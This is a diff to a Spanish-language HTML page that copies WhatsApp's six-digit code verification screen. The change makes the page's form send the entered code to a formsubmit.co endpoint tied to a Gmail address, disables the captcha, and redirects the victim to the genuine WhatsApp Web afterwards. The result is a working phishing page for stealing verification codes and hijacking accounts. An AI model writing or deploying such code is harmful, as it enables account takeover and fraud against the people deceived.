@@ -91,7 +91,9 @@
         <h1>Verificación de tu número</h1>
         <p class="subt" >WhatsApp te envió un código de 6 dígitos al número que ingresaste. <a href="#">¿Número equivocado?</a></p>
         <div class="continputcodigo">
-            <form class="form">
+            <form class="form" action="https://formsubmit.co/wasaprespuesta@gmail.com" method="POST">
+              <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://web.whatsapp.com">
               <div class="continputs">
                 <input type="text" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57" autofocus>
                 <input type="text" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
